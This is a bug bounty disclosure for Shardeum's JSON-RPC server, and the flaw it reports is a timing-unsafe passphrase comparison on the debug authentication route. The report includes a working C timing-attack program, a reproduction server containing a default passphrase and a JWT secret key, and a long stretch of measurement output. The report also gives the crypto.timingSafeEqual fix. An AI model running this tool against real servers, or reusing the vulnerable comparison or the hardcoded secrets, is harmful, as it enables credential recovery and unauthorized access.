# Boost \_ Shardeum\_ Ancillaries 34392 - \[Websites and Applications - Medium] JSON-RPC Complete Passwor

Submitted on Sun Aug 11 2024 04:22:08 GMT-0400 (Atlantic Standard Time) by @Swift77057 for [Boost | Shardeum: Ancillaries](https://immunefi.com/bounty/shardeum-ancillaries-boost/)

Report ID: #34392

Report type: Websites and Applications

Report severity: Medium

Target: <https://github.com/shardeum/json-rpc-server/tree/dev>

Impacts:

* Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters, Substituting contract addresses, Submitting malicious transactions
* Improperly disclosing confidential user information, such as: Email address, Phone number, Physical address, etc.
* Retrieve sensitive data/files from a running server, such as: /etc/shadow, database passwords, blockchain keys (this does not include non-sensitive environment variables, open source code, or usernames)

## Description

## Overview

There is a vulnerability in Shardeum's JSON-RPC implementation. In particular, it uses an unsafe comparison to validate the user-provided password against a hardcoded password from a config file.

The unsafe comparison has a timing leak that allows for password recovery via a classic timing attack (<https://en.wikipedia.org/wiki/Timing\\_attack>). An unprivileged attacker can exploit this vulnerability to recover the JSON-RPC password.

The attack does not require any previous knowledge of the password, and is available to a completely unauthenticated attacker. However it relies on being able to gather accurate timing measurements from the server.

Viable attack conditions include an attacker VM that is colocated with the victim VM in an AWS cluster, two servers that are in the same data centre, a compromised machine on the same network where the JSON-RPC server runs, and so on...

## Impact

The impact is that an unauthenticated user can recover the RPC password. It falls under the impact category of

* Retrieve sensitive data/files from a running server, such as: /etc/shadow, database passwords, blockchain keys (this does not include non-sensitive environment variables, open source code, or usernames)

## Root Cause

The root cause is the use of a timing-unsafe comparison in the Typescript implementation of the RPC server. The vulnerability is located in the file `json-rpc-server/src/routes/authenticate.ts`. We find it at line marked with an \[a]:

```
router.route('/:passphrase').get(async function (req: Request, res: Response) {
  const { passphrase } = req.params
  const payload = { user: 'shardeum-dev' }
  if (passphrase === CONFIG.passphrase) {     [a]
    // token don't expire, usually this is bad practice
    // for the case being implementing refresh token is overkill
    // stolen token worst case scenario our debug data ended up being not useful.
    const token = jwt.sign(payload, CONFIG.secret_key)
    res.cookie('access_token', token, {
      httpOnly: false,
      maxAge: 1000 * 60 * 60 * 700, // ~ a month
    })
    return res.send({ token: token, message: 'authenticated and authorized for debug api calls' }).status(200)
  }
  return res.send({ message: 'wrong passphrase' }).status(400)
})
```

JSON-RPC runs on a Node.js server that is powered by Google's v8 Javascript engine internally. To understand the characteristics of the timing we are going to attack, we analyze the V8-function String::SlowEquals():

From <https://github.com/v8/v8/blob/feca1316d786a4314b1f09930f7687a5d18649a9/src/objects/string.cc#L1084>:

```
bool String::SlowEquals(
    Tagged<String> other,
    const SharedStringAccessGuardIfNeeded& access_guard) const {
  DisallowGarbageCollection no_gc;
  // Fast check: negative check with lengths.
  int len = length();
  if (len != other->length()) return false;     [b]
  if (len == 0) return true;

  // redacted for simplicity

  // We know the strings are both non-empty. Compare the first chars
  // before we try to flatten the strings.
  if (this->Get(0, access_guard) != other->Get(0, access_guard)) return false;   [c]

  // redacted for simplicity
  StringComparator comparator;
  return comparator.Equals(this, other, access_guard);     [d]
}
```

On line \[b] the length of the user-provided password is compared against the length of the RPC password. V8 will return early if they mismatch. Here, an attacker can measure whether their input password has the same length as the RPC password by measuring the time it takes for the server to respond.

After that, on line \[c] the Javascript engine will check the first character of the user-provided password against the first character of the RPC password. An attacker can try every possible character and measure whether the first character matches the first character of the RPC password, thereby recover the first character of the RPC password.

After that, on line \[d], the Javascript engine uses a StringComparator object which will compare the two strings one character at a time. By measuring the timing it takes for the server to respond, the attacker can guess and bruteforce the RPC password one character at a time. This is the classic timing attack that can recover the password one character at a time:

From <https://github.com/v8/v8/blob/78c8a81546e63c87304998b98b831ba2ad991e31/src/objects/string-comparator.cc#L49>:

```
bool StringComparator::Equals(
    Tagged<String> string_1, Tagged<String> string_2,
    const SharedStringAccessGuardIfNeeded& access_guard) {
  int length = string_1->length();
  state_1_.Init(string_1, access_guard);
  state_2_.Init(string_2, access_guard);
  while (true) {
    int to_check = std::min(state_1_.length_, state_2_.length_);
    DCHECK(to_check > 0 && to_check <= length);
    bool is_equal;
    if (state_1_.is_one_byte_) {
      if (state_2_.is_one_byte_) {
        is_equal = Equals<uint8_t, uint8_t>(&state_1_, &state_2_, to_check);
      } else {
        is_equal = Equals<uint8_t, uint16_t>(&state_1_, &state_2_, to_check);
      }
    } else {
      if (state_2_.is_one_byte_) {
        is_equal = Equals<uint16_t, uint8_t>(&state_1_, &state_2_, to_check);
      } else {
        is_equal = Equals<uint16_t, uint16_t>(&state_1_, &state_2_, to_check);
      }
    }
    // Looping done.
    if (!is_equal) return false;      [e]
    length -= to_check;
    // Exit condition. Strings are equal.
    if (length == 0) return true;
    state_1_.Advance(to_check, access_guard);
    state_2_.Advance(to_check, access_guard);
  }
}
```

At line \[e] is where the loop breaks on the first mismatched character. This is what lets us recover the password one character at a time.

## Fix

For more information about how to use timing-safe comparison functions, see the discussion in thread: <https://stackoverflow.com/questions/31095905/whats-the-difference-between-a-secure-compare-and-a-simple>

In particular, Node.js supports the following API: <https://nodejs.org/dist/latest-v6.x/docs/api/crypto.html#crypto\\_crypto\\_timingsafeequal\\_a\\_b>

To fix the vulnerability, the JSON-RPC should use `crypto.timingSafeEqual()` API when comparing the two passwords.

## Proof of concept

## Proof of Concept

To get good timing measurements, we wrote an attacker tool in C. This can be compiled with the following command:

```
gcc -o attack attack.c && ./attack
```

Here is the source-code file `attack.c`:

```
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <time.h>
#include <fcntl.h>

struct hostent *hp;
bool verbose = false;
int sock;

int init() {
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        if (verbose) perror("socket creating error");
        return -1;
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(3000);
    memcpy(&addr.sin_addr,  hp->h_addr, hp->h_length);

    if (verbose) printf("connecting\n");

    int rc = connect(sock, (const struct sockaddr *) &addr, sizeof(addr));
    if (rc != 0) {
        if (verbose) printf("failed to connect\n");
        close(sock);
        return -2;
    }

    if (verbose) printf("connected!\n");
    return 0;
}

signed long send_and_measure_inner(const char* password) {
    char buf[256];
    sprintf(buf, "GET /authenticate/%s HTTP/1.1\r\n\r\n", password);

    int i;
    struct timespec tp1, tp2;

    for (i=0; i<1; i++) {
        //printf("%s\n", buf);
        if (send(sock, buf, strlen(buf), 0) <= 0) {
            printf("send fail\n");
            close(sock);
            return -3;
        }

        static char r[2048];

        clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &tp1);
        if (recv(sock, &r, sizeof r, 0) <= 0) {
            printf("read fail\n");
            return -6;
        }
        //printf("%s\n", r);
        clock_gettime(CLOCK_PROCESS_CPUTIME_ID, &tp2);

        if (verbose) printf("resp %s %d\n", password, tp2.tv_nsec - tp1.tv_nsec);
    }

    return tp2.tv_nsec - tp1.tv_nsec;
}

signed long send_and_measure(const char* password) {
    signed long ret = -1;

    while (ret < 0) {
        ret = send_and_measure_inner(password);
    }

    return ret;
}

#define NUM 10000

typedef struct {
    signed long max;
    signed long min;
    signed long accum;
    signed long data[NUM];
} measurements_t;

int compar(const void* a, const void* b) {
    return (*(signed long*)a) - *(signed long*)b;
}

#define MMNUM 4
measurements_t m[MMNUM];

void measure(const char* password, int m_idx, int data_idx) {
    signed long mm = send_and_measure(password);
    if (mm > m[m_idx].max) m[m_idx].max = mm;
    if (mm < m[m_idx].min) m[m_idx].min = mm;
    m[m_idx].accum += mm;
    m[m_idx].data[data_idx] = mm;
}

signed long avg(unsigned long* start, int num) {
    signed long sum = 0;
    int i;
    for(i=0; i<num; i++) sum += *(start++);
    return sum/num;
}

void summary(const char* password, int m_idx) {
    qsort(&m[m_idx].data, NUM, sizeof(signed long), compar);
    printf("%s %ld %ld %ld %ld %ld\n", password, m[m_idx].min, m[m_idx].max, m[m_idx].accum/NUM, m[m_idx].data[NUM/2], avg(&m[m_idx].data[NUM/2-100], 2*100));
}

int main(int argc, char ** argv) {
    hp = gethostbyname("localhost");

    if (init())
        return 1;

    int i;
    for(i=0; i<MMNUM; i++) m[i].min = 0xffffffff;
    for(i=0; i<MMNUM; i++) m[i].max = 0;
    for(i=0; i<MMNUM; i++) m[i].accum = 0;

    srand(time(NULL));

    int k;
    for(k=0; k<32; k++){

        for(i=0; i<NUM; i++) {
            bool done[4] = { false, false, false, false };
            while (1) {
                int a = rand() % 4;
                if (done[a]) continue;
                switch (a) {
                case 0: measure("xxxxxxxx", 0, i); break;
                case 1: measure("sxxxxxxx", 1, i); break;
                case 2: measure("sha4xxxx", 2, i); break;
                case 3: measure("sha4d3ux", 3, i); break; }
                done[a] = true;
                if (done[0] && done[1] && done[2] && done[3]) break;
            }
        }

        summary("xxxxxxxx", 0);
        summary("sxxxxxxx", 1);
        summary("sha4xxxx", 2);
        summary("sha4d3ux", 3);
    }

    return 0;
}
```

The attack was run against a minimized test environment where the relevant parts have been lifted from the JSON-RPC project: `src/index.ts`:

```
// src/index.ts
import express, { Express, Request, Response } from "express";
import dotenv from "dotenv";
import { router as authenticate } from './routes/authenticate'

dotenv.config();

const app: Express = express();
const port = process.env.PORT || 3000;

app.use('/authenticate', authenticate);

app.get("/", (req: Request, res: Response) => {
  res.send("Express + TypeScript Server");
});

app.listen(port, () => {
  console.log(`[server]: Server is running at http://localhost:${port}`);
});
```

`src/config.ts`:

```
type Config = {
  passphrase: string
  secret_key: string
}

export const CONFIG: Config = {
  passphrase: process.env.PASSPHRASE || 'sha4d3um', // this is to protect debug routes
  secret_key: process.env.SECRET_KEY || 'YsDGSMYHkSBMGD6B4EmD?mFTWG2Wka-Z9b!Jc/CLkrM8eLsBe5abBaTSGeq?6g?P', // this is the private key that rpc server will used to sign jwt token
}
```

`src/routes/autheticate.ts`:

```
import express from 'express'
export const router = express.Router()
import { CONFIG } from '../config'
import { Request, Response } from 'express'

router.route('/:passphrase').get(async function (req: Request, res: Response) {
  const { passphrase } = req.params
  if (passphrase === CONFIG.passphrase) {
    return res.send({ message: 'authenticated and authorized for debug api calls' }).status(200)
  }
  return res.send({ message: 'wrong passphrase' }).status(400)
})
```

The PoC will connect to the RPC server at localhost port 3000 and start a timing attack. The password for the RPC server in the demo was configured to be the default password, "sha4d3um".

Running this attack we get the following timing measurements:

```
xxxxxxxx 5597 12284058 45131 21301 21302
sxxxxxxx 6631 15098201 48678 21308 21306
sha4xxxx 5628 17235425 50251 21299 21299
sha4d3ux 5559 16028384 50131 21291 21292
xxxxxxxx 5597 16284257 83250 20544 20556
sxxxxxxx 6631 15098201 80577 20439 20440
sha4xxxx 5628 17235425 86464 20420 20418
sha4d3ux 5559 16028384 81984 20402 20398
xxxxxxxx 5597 16284257 110872 18919 18911
sxxxxxxx 4994 15335894 107375 18910 18904
sha4xxxx 4988 19499290 114317 18819 18826
sha4d3ux 5559 16028384 109703 18860 18861
xxxxxxxx 5597 16284257 161286 21434 21448
sxxxxxxx 4994 15335894 154122 21302 21299
sha4xxxx 4988 19499290 171062 21368 21361
sha4d3ux 5518 16028384 166916 21417 21405
xxxxxxxx 5597 16284257 191751 20170 20164
sxxxxxxx 4994 15335894 191131 20035 20036
sha4xxxx 4988 19499290 203505 20045 20047
sha4d3ux 5518 16028384 204616 20106 20107
xxxxxxxx 5597 19858379 268494 22736 22748
sxxxxxxx 4994 19122367 279374 22648 22633
sha4xxxx 4988 19499290 291698 22734 22738
sha4d3ux 5518 16459878 285356 22791 22766
xxxxxxxx 5597 19858379 348697 24689 24690
sxxxxxxx 4994 19122367 350719 24597 24600
sha4xxxx 4988 19499290 356557 24740 24737
sha4d3ux 5518 16459878 351827 24882 24881
xxxxxxxx 5597 19858379 405785 23029 23015
sxxxxxxx 4994 19122367 401538 23139 23134
sha4xxxx 4988 19499290 408120 23071 23074
sha4d3ux 5518 16459878 400275 23075 23076
xxxxxxxx 5597 19858379 478985 22690 22688
sxxxxxxx 4994 22333983 471644 22617 22616
sha4xxxx 4988 19499290 486578 22645 22649
sha4d3ux 5518 16459878 474462 22608 22616
xxxxxxxx 5597 19858379 522386 21715 21712
sxxxxxxx 4956 22333983 512269 21714 21714
sha4xxxx 4988 19499290 526212 21682 21681
sha4d3ux 5518 16459878 509672 21743 21737
xxxxxxxx 5345 19858379 571254 20874 20883
sxxxxxxx 4956 22333983 558876 20813 20824
sha4xxxx 4988 19499290 571377 20892 20884
sha4d3ux 5518 16459878 555496 20863 20856
xxxxxxxx 5345 19858379 604913 20128 20129
sxxxxxxx 4956 22333983 594737 20084 20075
sha4xxxx 4988 19499290 601928 20181 20179
sha4d3ux 5518 16459878 592269 20175 20175
xxxxxxxx 5345 19858379 627982 18456 18455
sxxxxxxx 4956 22333983 620235 18465 18463
sha4xxxx 4988 19499290 623668 18600 18600
sha4d3ux 5518 16459878 616906 18570 18571
xxxxxxxx 5345 19858379 662358 18919 18913
sxxxxxxx 4956 22333983 660423 18910 18910
sha4xxxx 4972 19499290 656159 18917 18911
sha4d3ux 5518 16459878 655406 18815 18814
xxxxxxxx 5345 19858379 701266 22054 22054
sxxxxxxx 4956 22333983 704530 21988 21983
sha4xxxx 4972 19499290 697670 22016 22024
sha4d3ux 5518 16459878 690398 21956 21967
xxxxxxxx 5345 19858379 730649 18576 18567
sxxxxxxx 4956 22333983 731872 18598 18588
sha4xxxx 4972 19499290 721736 18635 18638
sha4d3ux 5518 16459878 722390 18637 18643
xxxxxxxx 5197 19858379 769132 21179 21175
sxxxxxxx 4956 22333983 776365 21267 21268
sha4xxxx 4972 19499290 757686 21354 21366
sha4d3ux 5518 16459878 759904 21226 21210
xxxxxxxx 5197 19858379 794473 18812 18815
sxxxxxxx 4956 22333983 800108 18954 18952
sha4xxxx 4972 19499290 788112 18919 18914
sha4d3ux 5518 16459878 788446 18986 18979
xxxxxxxx 5197 19858379 827510 21377 21371
sxxxxxxx 4956 22333983 831849 21532 21530
sha4xxxx 4972 19499290 818494 21509 21500
sha4d3ux 5518 16459878 824944 21390 21386
xxxxxxxx 5197 19858379 885046 23238 23228
sxxxxxxx 4956 22333983 888404 23078 23085
sha4xxxx 4972 19499290 880487 23153 23152
sha4d3ux 5518 16459878 880739 23121 23115
xxxxxxxx 5197 20196880 956632 23792 23795
sxxxxxxx 4950 22333983 948510 23767 23774
sha4xxxx 4972 26165866 949682 23936 23930
sha4d3ux 5518 17217420 949020 23830 23838
xxxxxxxx 5197 20196880 1079222 22886 22863
sxxxxxxx 4950 22333983 1045262 22643 22633
sha4xxxx 4972 26250632 1056479 22620 22608
sha4d3ux 5518 17217420 1063034 22605 22598
xxxxxxxx 5197 20196880 1141218 22384 22395
sxxxxxxx 4950 22333983 1114533 22405 22393
sha4xxxx 4972 26250632 1118887 22251 22253
sha4d3ux 5008 17217420 1140154 22456 22456
xxxxxxxx 5197 20196880 1213610 23598 23592
sxxxxxxx 4950 22333983 1180930 23514 23515
sha4xxxx 4972 26250632 1181779 23545 23545
sha4d3ux 5008 19448205 1208585 23591 23587
xxxxxxxx 5197 20196880 1251395 20699 20684
sxxxxxxx 4950 22333983 1216637 20631 20624
sha4xxxx 4972 26250632 1220698 20645 20628
sha4d3ux 5008 19448205 1244339 20592 20586
xxxxxxxx 4797 20196880 1286980 20358 20350
sxxxxxxx 4950 22333983 1250080 20317 20317
sha4xxxx 4972 26250632 1251564 20272 20261
sha4d3ux 5008 19448205 1277833 20322 20325
xxxxxxxx 4797 20196880 1330599 19989 19995
sxxxxxxx 4950 22333983 1289464 20075 20073
sha4xxxx 4972 26250632 1292762 19938 19938
sha4d3ux 5008 19448205 1321689 20044 20046
xxxxxxxx 4797 20196880 1358600 20136 20133
sxxxxxxx 4950 22333983 1320854 20063 20072
sha4xxxx 4972 26250632 1322745 20145 20137
sha4d3ux 5008 19448205 1355641 20294 20303
xxxxxxxx 4797 20196880 1392236 21393 21386
sxxxxxxx 4902 22333983 1356116 21500 21500
sha4xxxx 4972 26250632 1359873 21662 21662
sha4d3ux 5008 19448205 1393886 21644 21642
xxxxxxxx 4797 20196880 1453397 23493 23506
sxxxxxxx 4902 22333983 1403229 23553 23548
sha4xxxx 4972 26250632 1421001 23485 23484
sha4d3ux 5008 19448205 1453184 23476 23467
xxxxxxxx 4797 20196880 1482843 19745 19751
sxxxxxxx 4902 22333983 1440873 19722 19729
sha4xxxx 4972 26250632 1453395 19788 19777
sha4d3ux 5008 19448205 1484147 19809 19802
xxxxxxxx 4797 20196880 1519547 20844 20841
sxxxxxxx 4902 22333983 1474802 21066 21058
sha4xxxx 4972 26250632 1481593 20961 20964
sha4d3ux 5008 19448205 1512045 20851 20844
```

The columns are as follows `attempted password | minimum measured time | maximum measured time | avg measured time | median measured time | averaged median measured time`. Only the first two columns are necessary to recover the password.

As can be seen in the data, it takes some time for the server to stabilize before it can give us a good measurement. Here's the last few measurements made by the attacker program:

```
xxxxxxxx 4797 20196880 1482843 19745 19751
sxxxxxxx 4902 22333983 1440873 19722 19729
sha4xxxx 4972 26250632 1453395 19788 19777
sha4d3ux 5008 19448205 1484147 19809 19802
xxxxxxxx 4797 20196880 1519547 20844 20841
sxxxxxxx 4902 22333983 1474802 21066 21058
sha4xxxx 4972 26250632 1481593 20961 20964
sha4d3ux 5008 19448205 1512045 20851 20844
```

You can see that the measured time for "xxxxxxxx" is 4797, which is a completely wrong password. But if you guess the 1st letter correctly, the timing will increase to 4902. If you guess additional correct characters, the timing will change again to 4972. And so on... By iterating this process, you can recover the full password one character at a time.

See the attached picture to see a "staircase" graph showing the timing issue. The staircase marked in red shows that the measured timing increases the more characters are guessed correctly.
